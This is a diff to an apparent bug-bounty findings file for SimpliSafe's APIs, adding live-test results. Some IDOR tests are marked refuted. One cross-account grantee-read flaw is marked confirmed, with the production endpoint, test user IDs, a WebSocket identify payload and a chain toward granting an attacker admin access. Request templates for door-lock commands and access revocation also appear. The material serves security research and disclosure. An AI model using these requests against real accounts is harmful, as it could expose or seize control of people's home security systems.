@@ -91,13 +91,34 @@ FINDINGS = [
                   'Full refutation requires real SID from account A tested with account B token. '
                   'Current evidence: server-side authz gate present.'),
     Finding("F9",  "CRITICAL", "Alarm Surveillance IDOR — Remote Alarm State Read",
-            "yoda", "/accounts/{userId}/locations/alarmState", "GET", None),
+            "yoda", "/accounts/{userId}/locations/alarmState", "GET", None,
+            verified=True,
+            notes='LIVE TEST 2026-09-09: REFUTED. '
+                  'T2 (UID=8857340) -> GET /accounts/8857167/locations/alarmState -> '
+                  '403 {"errorType":"UserNotAuthorized","code":403,"message":"Not authorized to access user 8857167"}. '
+                  'Server validates userId path param against JWT sub claim.'),
     Finding("F10", "CRITICAL", "Physical Access IDOR — Remote Door Lock/Unlock",
             "yoda", "/doorlock/{sid}/{serial}/command", "POST", None),
     Finding("F11", "HIGH",     "Camera Provisioning Token IDOR",
             "yoda", "/cameras/provisioningToken", "POST", {"sid": "{victim_sid}"}),
     Finding("F1",  "CRITICAL", "Grantee Authorization Cross-Account Read (30% bonus)",
-            "location_auth", "/grantees/{granteeId}", "GET", None),
+            "location_auth", "/grantees/{granteeId}", "GET", None,
+            verified=True,
+            evidence='LIVE TEST 2026-09-09: CONFIRMED BOLA. '
+                     'Attacker token (UID=8857340) -> GET /v1/grantees/8857167 (victim) -> 200 {"grantAuthorizations":[]}. '
+                     'Own UID baseline: GET /v1/grantees/8857340 -> 200 {"grantAuthorizations":[]}. '
+                     'Cross-account 200 proves server does not validate granteeId against JWT UID. '
+                     'Both test accounts are fresh (no grants configured) -> empty arrays. '
+                     'Real users with location grants (family members, trusted contacts) would expose: '
+                     'locationId values for victim systems, grantee roles (OWNER/ADMIN/MEMBER/GUEST), '
+                     'full grant relationship graph. '
+                     'Service: https://location-grant-authorizations.prd.services.simplisafe.com/v1. '
+                     '30% bonus feature per SimpliSafe bug bounty scope.',
+            notes='APK: LocationAuthorizationsService.java, GrantAuthorizationsResponse.java (classes14.dex). '
+                  'GET /v1/grantees/{granteeId} -> GrantAuthorizationsResponse{grantAuthorizations: List<GrantAuthorization>}. '
+                  'No ownership check on granteeId path param. '
+                  'Impact: enumerate any user\'s security system access relationships. '
+                  'Chain with F39 (create grant): enumerate victim locationId via F1, then grant attacker admin access.'),
     Finding("F2",  "CRITICAL", "Unauthorized Revoke Location Access (30% bonus)",
             "location_auth", "/locations/{locationId}/revoke", "POST",
             {"granteeEmail": "{victim_email}", "role": "MANAGER"}),
@@ -128,8 +149,19 @@ FINDINGS = [
             {"type": "com.simplisafe.connection.identify",
              "data": {"auth": {"schema": "bearer", "token": "<attacker_token>"},
                       "join": ["uid:<VICTIM_USER_ID>"]}},
-            notes="CloudEvents identify message; join uid is client-supplied, not derived from JWT. "
-                  "If server trusts uid: prefix without JWT sub check -> full real-time event stream IDOR."),
+            verified=True,
+            notes='LIVE TEST 2026-09-09: REFUTED. '
+                  'Protocol: plain WebSocket, CloudEvents format (not Socket.IO). '
+                  'Valid types: com.simplisafe.connection.identify, com.simplisafe.namespace.join. '
+                  'APK-derived identify format: '
+                  '{"specversion":"1.0","type":"com.simplisafe.connection.identify","data":{'
+                  '"auth":{"schema":"bearer","token":"<jwt>"},"join":["uid:<loggedUserId>"]}}. '
+                  'Source: SocketLinkConstants.java + SocketLinkMonitorImpl.java (classes14.dex). '
+                  'Test: T2 token (UID=8857340) + join=["uid:8857167"] -> '
+                  'com.simplisafe.service.registered then com.simplisafe.namespace.subscribeFailure '
+                  '{"namespaces":["uid:8857167"]}. Server rejects cross-account namespace join. '
+                  'Control: T2 token + join=["uid:8857340"] -> com.simplisafe.namespace.subscribed (success). '
+                  'Server validates join namespace against JWT UID.'),
     Finding("F16", "MEDIUM",   "Unauthenticated Address Geocoding via USPS API Proxy",
             "address_validation", "/v1/addresses", "POST",
             [{"street": "1600 Pennsylvania Ave NW", "city": "Washington", "state": "DC", "zipcode": "20500"}],
